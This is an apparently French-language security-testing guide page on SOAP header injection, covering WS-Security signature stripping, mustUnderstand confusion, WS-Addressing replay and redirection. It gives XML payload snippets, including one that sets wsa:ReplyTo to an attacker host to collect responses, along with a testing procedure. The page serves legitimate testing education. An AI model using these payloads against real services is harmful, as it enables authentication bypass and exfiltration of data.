---
order: 3
title: "Injection d'éléments d'en-tête SOAP"
description: "WS-Addressing, WS-Security et les en-têtes SOAP personnalisés analysés depuis un message partiellement de confiance exposent le rejeu, le stripping de signature et des bogues de gestion de mustUnderstand dans le middleware applicatif."
keywords:
  - injection d'en-tête SOAP
  - WS-Security
  - WS-Addressing
  - mustUnderstand
  - signature stripping
---

# Injection d'éléments d'en-tête

Le Header SOAP porte les préoccupations hors bande d'un message : adressage (WS-Addressing), jetons de sécurité et signatures (WS-Security), corrélation et en-têtes applicatifs personnalisés. Le middleware les traite avant que le corps n'atteigne le handler, et parce que les en-têtes proviennent du même message partiellement de confiance que le corps, un serveur qui les gère mal peut être amené à accepter des requêtes rejouées, re-routées ou non signées.

## Portée de signature et stripping

WS-Security signe des éléments sélectionnés, et la garantie ne couvre que ce qui a effectivement été signé. Lorsque le serveur vérifie qu'une signature est valide mais ne confirme pas qu'elle couvre les éléments sur lesquels la logique s'appuie, un attaquant conserve une signature valide sur un élément inoffensif et altère ou ajoute un élément non signé. Lorsque le traitement se poursuit même après la suppression d'un en-tête de sécurité, la signature est entièrement retirée :

```xml
<soap:Header>
  <wsse:Security soap:mustUnderstand="0">
    <!-- security header marked optional so a lenient server skips it -->
  </wsse:Security>
</soap:Header>
```

Mettre `mustUnderstand="0"` sur un en-tête de sécurité invite un serveur qui traite la compréhension comme optionnelle à l'ignorer, de sorte qu'une requête qui aurait dû être rejetée pour sécurité manquante ou invalide est traitée sans authentification.

## Adressage et rejeu

Les en-têtes WS-Addressing (`wsa:To`, `wsa:Action`, `wsa:ReplyTo`, `wsa:MessageID`) orientent où va une réponse et identifient le message. Un serveur qui fait confiance à `wsa:ReplyTo` envoie les réponses à un endpoint choisi par l'attaquant, et un serveur qui ne suit pas `wsa:MessageID` autorise le rejeu d'un message capturé, validement signé :

```xml
<soap:Header xmlns:wsa="http://www.w3.org/2005/08/addressing">
  <wsa:Action>urn:Transfer</wsa:Action>
  <wsa:ReplyTo><wsa:Address>http://attacker.example/collect</wsa:Address></wsa:ReplyTo>
</soap:Header>
```

## Confusion de mustUnderstand

L'attribut `mustUnderstand` indique au serveur si un en-tête est obligatoire. Le basculer sonde le middleware : un en-tête que le serveur devrait imposer mais qu'il saute lorsque `mustUnderstand="0"` révèle une imposition optionnelle, tandis qu'un en-tête que le serveur rejette comme non compris lorsque `mustUnderstand="1"` cartographie quels processeurs sont actifs.

## Confirmer la faille

Manipulez chaque classe d'en-tête et observez la décision : retirez ou rendez optionnel l'en-tête de sécurité et voyez si l'appel se traite tout de même ; altérez un élément non signé tout en conservant une signature valide sur un élément signé et voyez si le changement prend effet ; mettez `wsa:ReplyTo` sur un endpoint attaquant et guettez un contact hors bande ; rejouez un message signé capturé et voyez s'il est accepté deux fois. Chaque succès montre que le middleware fait confiance à un contenu d'en-tête qu'il n'a pas lié à l'identité ou à l'intégrité de la requête.

## Outils

- **Burp Repeater** : retrait d'en-têtes de sécurité, basculement de mustUnderstand et rejeu de messages signés.
- **SoapUI** : composition et manipulation d'en-têtes WS-Security et WS-Addressing.
- **Wsdler (extension Burp)** : transformation d'un WSDL en requêtes à éditer dans Burp.

## Références

- [OASIS: WS-Security](https://docs.oasis-open.org/wss/v1.1/)
- [OWASP: Testing for SOAP](https://owasp.org/www-project-web-security-testing-guide/)
